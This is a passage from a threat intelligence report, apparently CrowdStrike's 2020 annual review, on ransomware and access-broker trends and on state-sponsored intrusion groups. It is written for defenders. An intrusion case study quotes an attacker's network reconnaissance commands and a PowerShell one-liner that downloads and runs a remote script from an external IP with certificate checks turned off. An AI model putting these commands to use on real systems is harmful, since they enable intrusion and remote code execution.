SPIDER continue to drive innovation in the world of malware\ndevelopment. Over the year, CrowdStrike Intelligence noted trends in the use of\nopen-source obfuscation software and the targeting of virtualization environments\npioneered by these adversaries.\n\n\n###### ↘\n\n Notable to 2020 is the pivotal role access brokers play in the eCrime ecosystem, supporting a variety of actors to include BGH ransomware operators.\n\n\n-----\n\n###### Trends and Techniques\n\n Increasing Importance of Access Brokers\n\nAccess brokers are threat actors that gain backend access to various organizations\n(both corporations and government entities) and sell this access either on criminal\nforums or through private channels. When criminal malware operators purchase\naccess, it eliminates the need to spend time identifying targets and gaining access,\nallowing for increased and quicker deployments as well as higher potential for\nmonetization. Some access brokers escalate privileges to the domain administrator\nlevel (often advertised as “full access”), while other access brokers just provide the\ncredentials and endpoints necessary to gain access.\n\nThe use of access brokers has become increasingly common among BGH actors\nand aspiring ransomware operators. CrowdStrike Intelligence has observed some\naccess brokers associated with affiliates of RaaS groups.\n\nAccess brokers advertising on criminal forums likely use logs from commodity\ninformation stealers to aid in operations, and some actors may sell the credentials\nfrom these logs as claimed access. The information stealer logs typically contain\ndata such as IP addresses, endpoint URLs, login credentials, screenshots of the\nvictim's desktop, cookies, and browser autofill history that can be used to determine\nthe type of system used as well as provide a vector for initial access. CrowdStrike\nIntelligence has observed one access broker, known to be an affiliate of a\nransomware program, confirm they purchased logs to aid in their operations.\n\n###### Malware Obfuscation Implemented Into Build Processes\n\nIn 2020, CrowdStrike Intelligence observed WIZARD SPIDER and MUMMY\nSPIDER implement open-source software protection tools into their malware build\nprocesses. This technique was observed with WIZARD SPIDER’s inclusion of\n_ADVObfuscator into the group’s malware Anchor, BazarLoader and Conti to enable_\nstring obfuscation. In mid-2020, WIZARD SPIDER also implemented the use of the\nopen-source tool obfuscator-llvm for code obfuscation in samples of BazarLoader.\nA similar methodology was incorporated into MUMMY SPIDER’s Emotet malware\ndelivery platform.\n\nThe use of obfuscation techniques in malware is not new, but the inclusion of opensource tools into build processes is an interesting tactic that supports advanced\nadversaries seeking ways to keep their development processes agile. WIZARD\nSPIDER has likely adopted rapid development cycles to adapt to open-source\nreporting on their malware. Moving from custom obfuscation techniques to more\nstandardized tooling would support more frequent changes to their toolset.\n\nAlthough these tools are widely available, they can be complex to set up and often\nrequire a level of automated processes. For this reason, this tactic may not be widely\nadopted by less sophisticated threat groups. That said, more mature adversaries\nmay look to this method as a way to protect and obfuscate their malicious payloads.\nThe use of ADVObfuscator has also been observed in the ransomware variants\n_LockBit and SunCrypt._\n\n\n-----\n\n###### Targeting Virtualization Infrastructure\n\nIn 2020, CrowdStrike Intelligence observed both SPRITE SPIDER (the operators\nof Defray777) and CARBON SPIDER (the operators of DarkSide) deploy Linux\nversions of their respective ransomware families on ESXi hosts during BGH\noperations. While ransomware for Linux has existed for many years, BGH actors\nhave historically not targeted Linux, much less ESXi specifically. ESXi is a type of\nhypervisor that runs on dedicated hardware and manages multiple virtual machines\n(VMs). With more organizations migrating to virtualization solutions to consolidate\nlegacy IT systems, this is a natural target for ransomware operators looking to\nincrease the impact against a victim.\n\nAll identified incidents were enabled by the acquisition of valid credentials. In four\nseparate Defray777 incidents, SPRITE SPIDER used administrator credentials to\nlog in through the vCenter web interface. In one instance, SPRITE SPIDER likely\nused the PyXie remote access trojan (RAT) LaZagne module to harvest vCenter\nadministrator credentials stored in a web browser.\n\nBy targeting these hosts, ransomware operators are able to quickly encrypt multiple\nsystems with relatively few actual ransomware deployments. Encrypting one ESXi\nserver inflicts the same amount of damage as individually deploying ransomware\non each VM hosted on a given server. Consequently, targeting ESXi hosts can also\nimprove the speed of BGH operations. Additionally, due to their lack of conventional\noperating systems, ESXi hosts lack endpoint protection software that could prevent\nor detect ransomware attacks.\n\n###### Targeted eCrime Moves to BGH\n\nBy far the most relevant factor influencing targeted eCrime in 2020 is the efficacy of\nransomware operations. CARBON SPIDER dramatically overhauled their operations\nin 2020. In April 2020, the adversary abruptly shifted from narrow campaigns\nfocused entirely on companies operating POS devices to broad, indiscriminate\noperations attempting to infect large numbers of victims across all sectors. The goal\nof these campaigns was to deliver PINCHY SPIDER’s REvil RaaS. CARBON SPIDER\ndeepened their commitment to BGH in August 2020 by using their own ransomware,\n_DarkSide. In November 2020, the adversary took another step into the world of BGH_\nby establishing a RaaS-affiliate program for DarkSide, allowing other actors to use\nthe ransomware while paying CARBON SPIDER a cut.\n\nCARBON SPIDER’s shift away from POS campaigns exemplifies a broader\ntrend of targeted eCrime actors shifting targets to focus on BGH. For instance,\nANTHROPOID SPIDER, which in 2019 targeted financials, conducted opportunistic\nweb server exploitation campaigns in 2020 that primarily delivered MedusaLocker\nransomware. After February 2020, major adversaries COBALT SPIDER and\nWHISPER SPIDER apparently ceased spear-phishing activity against banks. It is\nlikely that actors associated with both COBALT SPIDER and WHISPER SPIDER\nremain involved in eCrime but have chosen other ways to generate income.\n\nTargeted eCrime has not ceased, however; emerging threats in 2020 included\nKNOCKOUT SPIDER and SOLAR SPIDER. KNOCKOUT SPIDER has conducted lowvolume spear-phishing campaigns focused on companies involved in cryptocurrency.\nSOLAR SPIDER’s phishing campaigns deliver the JSOutProx RAT to financial\ninstitutions across Africa the Middle East South Asia and Southeast Asia\n\n\n-----\n\n###### WIZARD SPIDER Continues Prolific Operations\n\nWIZARD SPIDER was the most reported criminal adversary for the second year in a\nrow. Although activity from this adversary was slow and sporadic in the first quarter\nof 2020, they progressively ramped up operations beginning in the second quarter\nand through the remainder of the year. Their diverse and potent toolset makes\nthis criminal group one of the most formidable adversaries in the current eCrime\nlandscape. CrowdStrike Intelligence has observed WIZARD SPIDER increase their\nsector targeting scope in 2020, particularly through the operation of Conti.\n\neCrime Reporting by Adversary\n\nWIZARD SPIDER\n\nPINCHY SPIDER\nCARBON SPIDER\nTWISTED SPIDER\nGRACEFUL SPIDER\nMUMMY SPIDER\n\nDOPPEL SPIDER\nVIKING SPIDER\nSPRITE SPIDER\nTRAVELING SPIDER\n\n**Figure 6. eCrime Reporting by Adversary in 2020**\n\nWIZARD SPIDER has maintained and forged powerful third-party relationships that\nbolster the initial access capabilities — for example, their continued relationship\nwith MUMMY SPIDER. They have updated their tooling and processes in 2020,\nimplementing obfuscation tools into their malware build processes and adopting\ncommodity tooling. These changes were almost certainly implemented to circumvent\nstatic detection and in response to open-source reporting focused on TrickBot and\nWIZARD SPIDER’s ransomware variants Ryuk and Conti.\n\n\n-----\n\n###### OverWatch Feature\n\n\n###### WIZARD SPIDER Targets Financial Institution\n\nDuring the first quarter of 2020, OverWatch identified a suspected eCrime attack\nagainst a financial institution. OverWatch threat hunters’ deep analysis of this intrusion\nplayed a pivotal role in providing greater insights into a complex threat landscape where\neCrime adversaries are increasingly improving their tradecraft.\n\n###### ADVERSARY LAUNCHES HIDDEN COMMAND SHELL\n\nDuring the course of routine hunting, OverWatch uncovered unusual behavior stemming\nfrom a running svchost.exe process on a Windows domain controller. A suspicious,\nreflectively loaded dynamic link library (DLL) launched within the svchost.exe netsvcs\ngroup and connected to the adversary-controlled domain statsgdoubleclick[.]net.\nWithin minutes, OverWatch identified that a hidden interactive command shell had\nspawned under the svchost.exe process, further indicating that a malicious implant\nwas running on the system.\n\n###### ADVERSARY DOUBLES DOWN ON ATTEMPT TO ACCESS THE VICTIM ENVIRONMENT\n\nThe hidden shell led to interactive, hands-on execution of various host and network\ndiscovery commands. Among the reconnaissance actions were efforts to enumerate\nDNS and other network infrastructure, with the likely intention of preparing for lateral\nmovement. Such commands included:\n\narp -a\n\ndnscmd /enumzones\n\ndnscmd /zoneprint [REDACTED]\n\nnbtstat -A 1 [REDACTED]\n\nnet sessions\n\nnet view\n\nnltest /domain_trusts\n\nThe victim did not perform an immediate and thorough response. Days later, the\nadversary returned and attempted to execute unknown PowerShell scripts from an\nexternal remote server:\n\npowershell.exe -nop\n\n$p=4484;[System.Net.ServicePointManager]::ServerCertificateValidation\nCallback={$true};iex(New-Object\n\nSystem.Net.WebClient).DownloadString('https://185.180.197[.]59/msys')\n\n\n-----\n\n###### OverWatch Feature\n\n\nTo run these commands, the adversary used another interactive shell facilitated by\nthe same previously identified implant running within the svchost.exe netsvcs group.\nThe Falcon platform’s prevention settings ensured that the PowerShell scripts failed to\nexecute properly. This led to the adversary attempting to diagnose their failure using\nthe following commands:\n\nwmic process where name=\"svchost.exe\" get\nprocessid,name,commandline,sessionid,creationdate\n\ntasklist /v\n\nAfter these failed attempts, the adversary gave up, likely leaving with hopes of finding\nan easier target.\n\n###### CONCLUSIONS AND RECOMMENDATIONS\n\nFurther analysis of all command-and-control activity involved in this latest intrusion\nidentified commonalities with known WIZARD SPIDER infrastructure. Regardless of\nthe adversary’s identity, defenders should pursue measures to prevent similar attacks.\nThis includes monitoring unusual behavior from svchost.exe instances, in particular\nthe presence of suspicious DLLs leveraging svchost.exe to make unusual network\nconnections to external infrastructure. Defenders should also consider monitoring for\nbursts of extensive network configuration discovery commands occurring on hosts or\nunder user accounts where such behavior is unexpected. Given the popularity of using\nPowerShell for post-exploitation command execution, another recommendation is\nmonitoring for atypical PowerShell processes connecting to external IPs or domains.\n\n\n-----\n\n###### eCrime Enablers\n\n\nTWISTED SPIDER\n\nEgregor\n\nProLock\n\nDoppelPaymer\n\nSCULLY SPIDER\n\n\nnablers are a pivotal part of the eCrime ecosystem, providing criminal\nactors with capabilities they may otherwise not have access to. These\nactors run malware-as-a-service operations, specialize in delivery\nmechanisms or exploit networks in order to sell initial access to other\n\n## E\n\ncriminal actors.\n\nThe relationships depicted in Figure 7 show that eCrime adversaries are not averse\nto working with, or purchasing from, other actors in order to enhance their own\ncampaigns, maximize profitability and increase the possibility of their success.\nThe downloader Amadey Loader and SMOKY SPIDER’s Smoke _Bot remain popular_\namong a variety of actors.

In keeping with this trend, CrowdStrike Intelligence\nobserved criminal adversaries that traditionally operate banking trojans providing\nthird-party access as well. Although LUNAR SPIDER has previously been known\nto offer malware distribution, recent BokBot infections have led directly to handson-keyboard activity rather than deploying malware. LUNAR SPIDER has been\nobserved supporting SPRITE SPIDER Defray777 campaigns but likely supports\nother BGH adversaries.\n\nMALLARD SPIDER is also likely acting as an access broker for BGH ransomware\noperators. There have been multiple instances in which QakBot infections have\nled to the deployment of ransomware, including Egregor, Maze, DoppelPaymer,\n_MedusaLocker and ProLock. Given that MALLARD SPIDER has historically been an_\ninsular group, they are likely selling access to these ransomware operators through\nprivate channels.\n\n###### Region Highlight: LATAM-Origin eCrime\n\nDuring 2020, CrowdStrike Intelligence tracked multiple variants of informationstealing malware originating from Latin America (LATAM) and likely developed by\nLATAM-based eCrime actors. These malware families include Culebra Variant, Salve,\n_Caiman and Kiron. The malware is available to purchase on underground forums,_\nresulting in its operation by multiple criminal actors. The most popular infection\nvector has been spam campaigns that rely on social engineering techniques to\nencourage interaction with hyperlinks in the email body, often using lure content with\na financial or COVID-19-related theme.\n\nThough traditionally observed targeting entities within LATAM countries, the\ncampaigns occasionally expanded to Spain or Portugal, often repurposing the same\nSpanish- or Portuguese-language content as the original LATAM-focused campaign.\nDuring 2020, CrowdStrike Intelligence observed the use of new lure content and\nlanguages, including French and Italian. It is likely that, having established their\nTTPs, these eCrime actors are now expanding their focus to European countries.\nUltimately, a successful infection relies on the victim interacting with the email and\nits malicious content, so tailoring the email to the language of the target country and\nusing emotive themes improve infection rates.\n\n\n-----\n\n###### Outlook\n\nEnablers will continue to be important actors in the eCrime ecosystem. Similar to\nLUNAR SPIDER and MALLARD SPIDER, it is likely that criminal actors operating\nbotnets will attempt to capitalize on their infections by offering access to others.\nWhile enablers maintain a constant presence on criminal forums, more sophisticated\nactors continue to support others through private channels. It is likely that as some\nof these access brokers become more sophisticated, they may move away from\nforums to sell their wares.\n\nCriminal actors operating out of LATAM appear to be increasing and will likely\ncontinue to develop and upgrade a variety of malware variants. As LATAM-based\ncriminal operators become more comfortable with their TTPs, campaigns using\nlinguistic ties to target European countries are expected to be observed in 2021.\n\n\n-----\n\n###### Targeted Intrusions\n\nn addition to the intrusions that appeared to be motivated by the COVID-19\npandemic (noted previously), targeted intrusion actors from China, Russia,\nIran, North Korea, India, Pakistan and Vietnam pursued actions on objectives\nlikely related to strategic national security and espionage priorities dictated\n\n## I\n\nby their respective states. CrowdStrike Intelligence continued to identify currency\ngeneration activity from North Korean adversaries and uncovered details of selfprofit operations attributed to Iran-based PIONEER KITTEN. Details of WICKED\nPANDA/SPIDER’s moonlighting activities were revealed in the 2020 indictments of\nindividuals associated with this adversary. Indictments and public disclosures most\nnotably targeted the activities of Russian adversaries, although it is unlikely these\nactor groups will be undeterred in the long term.\n\n\n###### ↘\n\n In 2020, targeted intrusion actors from China, Russia, Iran, North Korea, India, Pakistan and Vietnam pursued actions on objectives likely related to strategic national security and espionage priorities dictated by their respective states.\n\n\n-----\n\n### CHINA\n\n\n###### ↘\n\n Chinese adversaries enhanced their cyber capabilities through ongoing tool development and sharing, while maintaining their status as one of the most prolific state-sponsored cyber actors on the planet.\n\n\nBy all accounts, 2020 was a challenging year for Beijing. The outbreak of\nCOVID-19 — with Wuhan as its epicenter — and managing the fallout of its global\nspread consumed much of the Chinese Communist Party's (CCP) efforts. A brief\nreduction in activity from Wuhan-based adversaries demonstrated that COVID-19\nhad a tactical impact as well as a strategic one. The outbreak was coupled with an\nincreasingly aggressive trade war with the U.S., limiting Chinese firms’ access to\ncritical technologies such as semiconductors, while at the same time levying high\ntariffs on goods destined for foreign markets.\n\nChina-based adversaries continued targeted operations throughout 2020 that\nlargely aligned with historic focuses on espionage, intellectual property theft\nand surveillance. Chinese adversaries enhanced their cyber capabilities through\nongoing tool development and sharing, while maintaining their status as one of the\nmost prolific state-sponsored cyber actors on the planet. CrowdStrike observed\nintrusions by at least 11 named Chinese adversaries and seven suspected Chinaorigin activity clusters, with operations aligning with the objectives outlined in the\n13th Five-Year Plan (13FYP). As such, a wide range of sectors were targeted, with\nparticular attention paid to organizations in the telecommunications, government,\nhealthcare and technology sectors. A focus on the telecommunications sector in\nparticular was a continuation from the trend observed in 2019; named adversaries\ntargeting telecommunications organizations in 2020 included WICKED PANDA,\nCIRCUIT PANDA and PHANTOM PANDA.\n\nChina Reporting by Adversary\n\nWICKED PANDA\n\nCIRCUIT PANDA\nPIRATE PANDA\nJUDGMENT PANDA\nKRYPTONITE PANDA\nWICKED SPIDER\n\nDEEP PANDA\nEMISSARY PANDA\nGOBLIN PANDA\nKARMA PANDA\n\n**Figure 8.

The adversary began 2020 by conducting a wide-ranging\ncampaign focused on exploiting multiple vulnerabilities (CVE-2019-19781 and CVE2020-10189) that cut across verticals and geographies. Upon successful exploitation,\nthey deployed Cobalt _Strike and Meterpreter payloads to further interact with victims._\nAs the year progressed, they continued using Cobalt _Strike as well other loaders and_\nmalware families such as Proxip, AttachLoader, ShadowPad and Winnti.\n\nWICKED SPIDER/PANDA Activity by Industry\n\nAcademic\n\nManufacturing\nGovernment\nTelecommunications\nComputer Gaming\nTechnology\n\nAviation\nDefense\nFinancial Services\nHealthcare\n\n**Figure 9. WICKED PANDA’s Wide-Ranging Target Scope in 2020**\n\nIn September 2020, the U.S. DOJ announced indictments against individuals\nassociated with WICKED PANDA operations, painting one of the clearest pictures\nyet of how a Chinese group was allowed to operate illicit for-profit cyber operations\nagainst video game firms for years without punishment, while also supporting\nstate-directed intelligence requirements. Despite these high-profile indictments,\nCrowdStrike Intelligence continued to see WICKED PANDA conduct operations\nthroughout late 2020.\n\n\n-----\n\n### CHINA\n\n###### Previewing the 14th Five-Year Plan\n\nIn October 2020, the CCP outlined the party's 14th Five-Year Plan (14FYP/十四个五年\n**规划) lasting from 2021-2025 and the Long-Term Vision for 2035 (2035 Vision/2035**\n**远景目标). Though the new plan will not become formalized until March 2021, a**\n[preliminary communique released following the October meeting outlined the CCP’s](https://cset.georgetown.edu/wp-content/uploads/t0237_5th_Plenum_Proposal_EN-1.pdf)\n[overall ambitions, with areas of focus to include:](https://cset.georgetown.edu/wp-content/uploads/t0237_5th_Plenum_Proposal_EN-1.pdf)\n\n**1. \u0007Technology and Research & Development: Improve scientific and**\ntechnological self-reliance and support innovation-driven technological\nbreakthroughs.\n\n**2. \u0007Economic Data: Enhance domestic market and build a high-level socialist**\nmarket economic system.\n\n**3. \u0007Agriculture and Clean Energy: Promote green development, and agricultural**\nand rural development.\n\n**4. \u0007Urban Planning: Optimize layout of urban and rural development; alleviate**\npoverty in rural areas.\n\n**5. \u0007Healthcare and Insurance: Improve quality of life and equalization of basic**\npublic services; create a comprehensive health system.\n\n**6. Media: Improve the country’s cultural soft power and cultural industry.**\n\n**7. \u0007Defense: Accelerate the modernization of national defense and the army to**\nsupport the objectives of a rich country and a strong military.\n\nAchieving new technological breakthroughs will likely underpin nearly all of China’s\nshort- and medium-term goals. The CCP’s technology transfer programs combine\nphysical and cyber methodologies to identify key intelligence gaps and then seek\nto satisfy those gaps via cyber theft, cyber espionage, joint ventures or corporate\nacquisitions. CrowdStrike Intelligence assesses with high confidence that Chinanexus adversaries will almost certainly continue to support these objectives in 2021\nin the absence of any meaningful consequences. The CCP’s mention of accelerating\nits military and soft power within the 14FYP is also notable and suggests continuing\nefforts to improve the People's Liberation Army Strategic Support Force (PLASSF)\nand Chinese cyber forces.\n\n###### Outlook\n\nThough 2020 saw a high increase in the number of China-related U.S. DOJ\nindictments, as well as significant tariffs levied by the U.S., these had relatively little\nimpact on China’s cyber operational tempo, as evidenced by WICKED PANDA’s\nreturn mere weeks after its public indictment. Critical improvements to watch for\nfrom China in 2021 include a resurgence of PLASSF-affiliated adversaries with\n\n\n-----\n\n### CHINA\n\nimproved TTPs, and increasingly focused and automated disinformation campaigns.\nPrior to the 2015 PLASSF reorganization announcement, PLA-associated\nadversaries regularly targeted government, military, defense, academic and think\ntank organizations, among others. CrowdStrike Intelligence assesses with high\nconfidence that this targeting pattern will likely return as these adversaries seek to\nre-establish themselves. China's cyber operators are also likely to continue enabling\nthe widely reported human rights abuses against Tibetans and Uyghur minorities,\ndomestic and abroad, through aggressive surveillance measures including mobile\ndevice targeting, compromise of personal email accounts and devices, and ongoing\naccess to upstream providers.\n\nMore contemporary China-based operators are likely to continue to diversify their\ntradecraft and toolsets and improve their operational techniques, as evidenced\nby recent malware developments, such as AvantGard, Clambling (the successor\nof PlugX) and ShadowPad. China-nexus adversaries will also likely continue to\nutilize commoditized and open-source tools such as Cobalt _Strike and Mimikatz._\nCrowdStrike Intelligence assesses these groups will also likely continue to conduct\nsoftware supply-chain compromises, given their prior successes throughout late\n2019 and 2020.\n\n\n-----\n\n### RUSSIA\n\n\n###### ↘\n\n While there may be some tactical-level changes to Russian operations in the short term, adversary action was not significantly deterred overall in 2020.\n\n\nThroughout 2020, the activities of several Russian-nexus adversaries, particularly\nstate-operated groups, were the subject of public disclosure through the release of\nstatements made by Western government organizations. The quantity and breadth\nof information released regarding Russian intrusion operations is unprecedented and\nlikely reflects a focused effort to disrupt these activities by enabling defenders and\nusing “soft messaging” techniques designed to influence adversary behavior.\n\nWhile there may be some tactical-level changes to Russian operations in the short\nterm — for example, CrowdStrike Intelligence has observed a continued reduction\nin malware-driven FANCY BEAR operations, as well as ongoing development of\nVENOMOUS BEAR tooling — adversary action was not significantly deterred\noverall in 2020. BERSERK BEAR demonstrated significantly elevated targeting of\nWestern organizations during 2020, mainly driven by campaigns that have been\nobserved throughout the year against government and transport sectors in North\nAmerica. Meanwhile, PRIMITIVE BEAR maintained their Ukrainian-centric interest,\nwith sighting of regular activity targeting Ukrainian government and official bodies.\nThis actor demonstrated significant maturation with their attempts to improve their\noperational security, tradecraft and tooling.\n\n###### TTP Highlight: Targeting VPN Connections\n\nA common initial network compromise TTP observed across multiple Russian\nadversaries in 2020 was attempting to gain access to targets through the exploitation\nof internet-accessible network devices and services, particularly those supporting\nvirtual private network (VPN) connections. These techniques have the benefit of being\nrelatively covert if the attempts fail, but can yield extensive access if they succeed. It\nis worth noting that much of the reported exploitation activity against these devices\ntarget previously patched vulnerabilities, and therefore it is possible that future\nintrusions may be supported by the exploitation of zero-day vulnerabilities if target\nnetworks are found to be hardened against an adversary’s current capability.\n\n\n-----\n\n### RUSSIA\n\nVulnerability\nTarget Product Adversary Use\nIdentifier\n\nBERSERK BEAR\nCVE-2019-11510 Pulse Connect Secure (PCS) COZY BEAR\nVENOMOUS BEAR\n\nBERSERK BEAR\nCVE-2018-13379 FortiGuard FortiOS SSL VPN\nCOZY BEAR\n\nPalo Alto Networks OS (including\nCVE-2020-2021 BERSERK BEAR\nGlobalProtect VPN)\n\n**Table 6. Russian Adversary Exploitation of VPN Vulnerabilities**\n\n###### Outlook\n\nIn previous years, Russian state-operated groups have been characterized by\nsignificant investment in the development and deployment of custom malware\nfamilies to support their intelligence gathering activities. With this dependency\ncomes increased scrutiny from security researchers and network defenders,\nincreasing the resource costs for adversaries that have to continually update their\ntoolsets to evade detection. While various Russian adversaries continue to employ\nmalware as part of their operational toolkits, they have also increasingly sought\nto shortcut traditional operational workflows and focus directly on intelligence\ncollection from third-party services used by their targets, including direct access\nto cloud-based network resources such as email servers. CrowdStrike Intelligence\nanticipates this trend is likely to continue in 2021, with previous attempts to breach\nsingle accounts via phishing campaigns making way for larger-scale operations\nagainst enterprise assets using compromised administrator credentials.\n\nFrom a geopolitical perspective, to counter historically low domestic approval for\nPresident Vladimir Putin amid ongoing COVID-19-related economic contraction in\n2021, Russia will likely continue to assert its interests abroad, particularly in hotspots\nsuch as Nagorno-Karabakh and Ukraine, while deepening ties with strategic partners\nsuch as China and select African nations. To this end, Russia is likely to continue to\nconduct cyber-enabled espionage against Western military and political targets, and\nin key sectors related to the energy, defense and high-tech industries. Moscow’s\nrelationship with the U.S. is likely to remain adversarial in 2021, with the transition\n[to U.S. President Joseph Biden unlikely to improve relations with Russia or reduce](https://www.whitehouse.gov/briefing-room/statements-releases/2021/01/26/readout-of-president-joseph-r-biden-jr-call-with-president-vladimir-putin-of-russia/)\nstate-sponsored cyber operations targeting political and military intelligence related\nto the U.S. and its European allies. Further, Russia will likely continue to conduct\ninformation operations against geopolitical competitors, particularly the U.S. These\nhistorically include leaks and intrusions, with targeting that exploits internal political\ndivisions or instability to exacerbate existing tensions.\n\n|Vulnerability Identifier CVE-2019-11510|Target Product Pulse Connect Secure (PCS)|Adversary Use BERSERK BEAR COZY BEAR VENOMOUS BEAR|\n|---|---|---|\n|CVE-2018-13379|FortiGuard FortiOS SSL VPN|BERSERK BEAR COZY BEAR|\n|CVE-2020-2021|Palo Alto Networks OS (including GlobalProtect VPN)|BERSERK BEAR|\n\n\n-----\n\n### IRAN\n\n###### ↘\n\n Iranian adversaries are likely to place further focus on the exploitation of network services to enable intrusion into target networks in 2021.\n\n\nIranian targeted-intrusion adversaries were active throughout 2020. In contrast to\nexpectations related to major developments early in 2020, such as the killing of\nQassem Soleimani of the Islamic Revolutionary Guards Corps (IRGC) Quds Force, the\noverwhelming majority of this activity appears to have been espionage-oriented. Even\nas the COVID-19 pandemic significantly affected Iran, these adversaries’ activities\nmore generally reflected traditional intelligence requirements, although there were\nsome exceptions. Notable developments included COVID-19-related targeting by\nSTATIC KITTEN, the emergence of a discretely targeted collection enterprise\nadjacent to HELIX KITTEN, and PIONEER KITTEN being linked to eCrime activity,\nshifting focus from intelligence collection to disruptive ransomware operations.\n\nCrowdStrike Intelligence assesses with moderate confidence that Iranian\nadversaries are likely to place further focus on the exploitation of network services to\nenable intrusion into target networks in 2021, reducing — but not eliminating — their\nuse of other client-focused intrusion methods such as strategic web compromises\n(SWCs) or spear-phishing attacks.\n\n###### Discrete Separation of Targeting Between Adversaries\n\nThroughout 2020, multiple Iranian targeted-intrusion actors were observed\nexhibiting a particular behavior: targeting only a specific sector or geographic area.\nTargeted-intrusion adversaries, including those with an Iranian nexus, typically\ntarget multiple regions and sectors concurrently. However, in four separate\ncases, adversaries with varying technical links to HELIX KITTEN each exhibited\na distinct and narrowly focused target scope during their 2020 activities. These\nadversaries included HELIX KITTEN itself, TRACER KITTEN, and the activity\nclusters DistortedShepherd and ScorchedEpoch. Table 7 shows these adversaries’\nrespective target scopes and technical links to HELIX KITTEN.\n\n\n-----\n\n### IRAN\n\n|Actor HELIX KITTEN|Target Scope in 2020 Government entities in Lebanon|Technical Link to HELIX KITTEN N/A|\n|---|---|---|\n|TRACER KITTEN|Telecommunications entities in the Middle East, particularly Iraq|Shared compilation artifacts and a shared C2 protocol implementation between TRACER KITTEN and HELIX KITTEN tools|\n|DistortedShepherd|Entities in the United Arab Emirates|Architecture and technical sophistication similarities between DistortedShepherd and HELIX KITTEN tools|\n|ScorchedEpoch|Telecommunications and government entities in Africa|Behavioral implementation and C2 protocol methodology similarities between ScorchedEpoch and HELIX KITTEN tools|\n\n\n**Table 7. Discrete Target Scopes Surrounding Activity Adjacent to HELIX KITTEN in 2020**\n\nThese technical links to HELIX KITTEN parallel similar connections previously\nidentified between HELIX KITTEN and REMIX KITTEN, the latter of which also\nhas exhibited a specifically counterintelligence-oriented target scope over time.\nThese points indicate it is likely that all five adversaries share, to some degree, an\noperational support entity that engages in activity such as malware development\nand infrastructure management. The likely presence of a shared support element,\ncombined with the existence of discretely separated target scopes between\nadversaries, is indicative of a broader, unified intelligence collection enterprise that\nis directed and coordinated by a central authority (such as a foreign intelligence\nservice). The precise contours of that enterprise are actively under investigation.\n\n###### Iran-based Adversaries Blend eCrime and Targeted Intrusion Tradecraft\n\nSince mid-2020, there has been emerging evidence of eCrime tactics converging\nwith Iran-nexus targeted intrusion operations. The first case of this convergence\nwas in July 2020, when an actor associated with PIONEER KITTEN was identified\nadvertising to sell access to compromised networks on an underground forum.\nThat activity highly likely represented PIONEER KITTEN operators attempting to\ngenerate personal gain via the unapproved sale of accesses originally secured at\nthe behest of the Iranian government for intelligence operations purposes. Also\n\n\n-----\n\n### IRAN\n\n###### ↘\n\n\nduring July 2020, there was an overlap between targeted intrusion operations\nby STATIC KITTEN and disruption-oriented Thanos ransomware activity by the\nTarnishedGauntlet activity cluster. This overlap included both the adversary and\nthe activity cluster targeting the same victims at the same time, which could\nrepresent coordinated intrusion activity between the two actors. Finally, since at\nleast November 2020, PIONEER KITTEN has been conducting a disruption-oriented\nransomware campaign leveraging the Pay2Key ransomware variant, primarily\ndeployed against Israeli targets. Unlike that adversary’s earlier eCrime activity, this\n_Pay2Key activity is likely being undertaken at the direction of the Iranian government_\nand appears not to be oriented toward revenue generation.\n\n###### Outlook\n\nWhile coordination between STATIC KITTEN and TarnishedGauntlet remains\nuncorroborated, PIONEER KITTEN’s shift toward disruptive ransomware operations\neerily parallels the disruptive impacts of TarnishedGauntlet’s Thanos operations\nagainst STATIC KITTEN victims. As Iranian adversaries continue to be publicly\ntargeted by dissident entities, leak outlets, Western government advisories, and\nindustry reporting, it is likely that Iranian cyber operations will continue to experiment\nwith blurring the lines between eCrime and targeted intrusion tradecraft in order\nto generate desired effects or at least complicate attempts at attribution. This is\nanticipated to occur while Iranian adversaries continue to engage in traditional\nintelligence activities, as well as support information operations. It remains to be\nseen whether or not the unified intelligence collection enterprise surrounding HELIX\nKITTEN will continue to exhibit discrete collection foci or if it will shift in response to\nfuture developments.\n\nIn 2020, Iran elected an IRGC-dominated parliament and experienced worsening\nrelations with its principal rivals, the U.S., Saudi Arabia and Israel. In 2021, Iranian\ncyber adversaries and Iran-backed militias are likely to remain engaged in\nongoing, low-level conflicts focused on targeting these countries; these conflicts\nhave historically been highlighted by instances of kinetic action and disruptive\ncyberattacks by both sides. Iran is also likely to experience increasing regional\nisolation following significant diplomatic overtures by Gulf Arab states to Israel,\nand expectations for 2021 to see a potential hardliner, IRGC-backed presidential\ncandidate emerge victorious. CrowdStrike Intelligence assesses that these factors\nwill likely contribute a highly permissive environment for Iranian cyber adversaries to\naid internal suppression and pursue targeted intrusions abroad.\n\n\n###### Consistent Iranian Hacktivist Activity In addition to targeted intrusion activity, Iranian hacktivists continued to launch operations parallel to the foreign policy objectives of the Iranian government throughout 2020. Such operations came about most frequently in response to sporadic escalations in regional tensions, especially during instances of widespread media speculation surrounding Israeli actions toward Iran, such as the purported Israeli sabotaging of Iranian nuclear facilities and, most starkly, the November assassination of Iranian nuclear scientist Mohsen Fakhrizadeh. Groups such as ICTUS Team, Unidentified Team and Bax026 (aka FRONTLINE JACKAL) have maintained social media channels for the dissemination of nationalistic messaging as well as claims of network compromise of infrastructure belonging to organizations within Israel and allied governments, especially the United States.\n\n\n-----\n\n### N. KOREA\n\n\n###### ↘\n\n In 2020, DPRK operations broadly exhibited a twofold mission: intelligence collection and currency generation.\n\n\nCrowdStrike Intelligence tracked activity from all five named DPRK adversaries —\nLABYRINTH CHOLLIMA, STARDUST CHOLLIMA, SILENT CHOLLIMA, VELVET\nCHOLLIMA and RICOCHET CHOLLIMA — in 2020. DPRK operations this year\nbroadly exhibited a twofold mission, focusing on intelligence collection and currency\ngeneration. Campaigns have primarily been aimed at North America, Europe,\nSouth Korea and Japan. Espionage operations have centered on East Asia/Korea\nforeign policy and military technology. With the start of the COVID-19 pandemic,\nCrowdStrike Intelligence observed multiple DPRK adversaries expand their target\nscopes to the healthcare sector. Observed efforts from DPRK actors centered on\ncompanies leading research on COVID-19 vaccine candidates, and it is likely these\nadversaries were focused on gathering intellectual property that could assist North\nKorea in the development of its own vaccine.\n\nCyber-enabled currency generation continued apace in 2020; however, DPRK\nadversaries placed a greater emphasis on obtaining capital through more common\neCrime tactics such as ransomware, extortion, and the targeting of cryptocurrency\nexchanges, rather than through the complex infiltrations that manipulated financial\ninfrastructure, as previously seen from North Korea.\n\n###### Actor Highlight: LABYRINTH CHOLLIMA\n\nThroughout much of 2020, LABYRINTH CHOLLIMA was not only the most prolific\nDPRK adversary, but also one of the most active targeted-intrusion adversaries\ntracked by CrowdStrike Intelligence. CrowdStrike Intelligence observed 